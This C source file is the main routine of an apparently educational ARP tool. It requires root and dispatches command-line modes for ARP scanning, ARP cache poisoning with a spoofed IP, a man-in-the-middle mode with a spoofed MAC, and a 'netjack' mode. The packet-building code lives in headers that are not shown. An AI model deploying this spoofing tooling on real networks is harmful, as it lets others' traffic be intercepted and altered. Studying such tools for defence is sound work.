/*#############################################################################*
 *                                                                             *
 *          eframe.c            July 20, 2013           project eframe         *
 *                                                                             *
 *      This project was written for educational purposes of the coder. It     *
 *  was not intended to be shared. So if you get it, try not to give it around *
 *  because it probably will make me look bad.                                 *
 *                                                                             *
 *      This project uses several methods of generating ARP packets. One       *
 *  method simply writes a given value into a buffer. It relies on memorizing  *
 *  the ARP packet structure. The other method is to structure this packet     *
 *  with a struct and fill in the values of the stuct.                         * *                                                                             *
 *############################################################################*/

     #include "efunctions.h"     
     #include "arpsend.h"
     #include "arpois.h"
     #include "netjack.h"
     #include <string.h>
     #include <stdio.h>
     #include <stdlib.h>    // for exit() function



     /* entry point to eframe */
     int main(int argc, char *argv[])
     {

         // ensure we are root to proceed
         if(getuid() != 0) 
         { 
            printf("You must be root\n"); 
            exit(1); 
         }

         if(argc < 3)
         {
            Print_Help();   
            exit(1);
         }
         char ifName[IFNAMSIZ];
         /* Get interface name */
         int j, f_z;          // z = a flag to see if -i is used
         f_z = 0;
         for(j = 0; j < argc; j++)
         {
            if(strcmp(argv[j], "-i") == 0)
            {
                strcpy(ifName, argv[j + 1]);
                f_z = 1;
                break;
            }    
            else
                strcpy(ifName, DEFAULT_IF);
         }
       
         
         // go poison route or go ip scanning route
         int arrayslot4reqorpois = 3;
         if(f_z == 0)
            arrayslot4reqorpois = 1; 
         else
            arrayslot4reqorpois = 3; 

         // if user using the -req flag....
         if(strcmp(argv[arrayslot4reqorpois], "-req") == 0)
         {
             // get our interface IP
             int ip_1[4] = { 0, 0, 0, 0 };
             IPstring2intarray(argv[arrayslot4reqorpois + 1], ip_1);

             // set the flag to either ping the network or send one packet
             int f_polling = 0;
             if(ip_1[0] == 255 && ip_1[1] == 255 && ip_1[2] == 255 && ip_1[3] == 255)
                 f_polling = 1;


             if(ARP_Request(ifName, ip_1, f_polling) != 0)
                 printf("error in ARP request sending.\n");
         }
         
         // if user using the -pois flag....
         else if(strcmp(argv[arrayslot4reqorpois], "-pois") == 0)
         {
             // get out destination MAC address as an array....
             int mac_1[6] = { 0, 0, 0, 0, 0, 0 };
             MACstring2intarray(argv[arrayslot4reqorpois + 1], mac_1);
             // get our destination IP
             int ip_1[4] = { 0, 0, 0, 0 };
             IPstring2intarray(argv[arrayslot4reqorpois + 2], ip_1);
             // get our spoof IP
             int ip_2[4] = { 0, 0, 0, 0 };
             IPstring2intarray(argv[arrayslot4reqorpois + 3], ip_2);
             // now send the poison arp response
             if(ARP_Response(ifName, mac_1, ip_1, ip_2, NULL, 1))
                printf("error in ARP response sending.\n");
         }

         else if(strcmp(argv[arrayslot4reqorpois], "-mim") == 0)
         {
             // get out destination MAC address as an array....
             int mac_1[6] = { 0, 0, 0, 0, 0, 0 };
             MACstring2intarray(argv[arrayslot4reqorpois + 1], mac_1);
             // get our destination IP
             int ip_1[4] = { 0, 0, 0, 0 };
             IPstring2intarray(argv[arrayslot4reqorpois + 2], ip_1);
             // get our spoof IP
             int ip_2[4] = { 0, 0, 0, 0 };
             IPstring2intarray(argv[arrayslot4reqorpois + 3], ip_2);
             // get our spoofed mac address
             int mac_2[6] = { 0, 0, 0, 0, 0, 0 };
             MACstring2intarray(argv[arrayslot4reqorpois + 4], mac_2);
             // now send the poison arp response
             // and start the arp daemon
             if(ARP_Response(ifName, mac_1, ip_1, ip_2, mac_2, 2))//try4now
                printf("error in ARP response sending.\n");
         }
         else if(strcmp(argv[arrayslot4reqorpois], "-netjack") == 0)
         {
             // now send the poison arp response
             // and start the arp daemon
             if(ARP_Response(ifName, NULL, NULL, NULL, NULL, 0) != 0)
             {
             //if(ARP_Daemon(ifName, NULL, NULL, NULL, NULL, 0))
                printf("error in netjacking procedure. Exiting now....\n"); 
             }
         }
         return 0;
     }


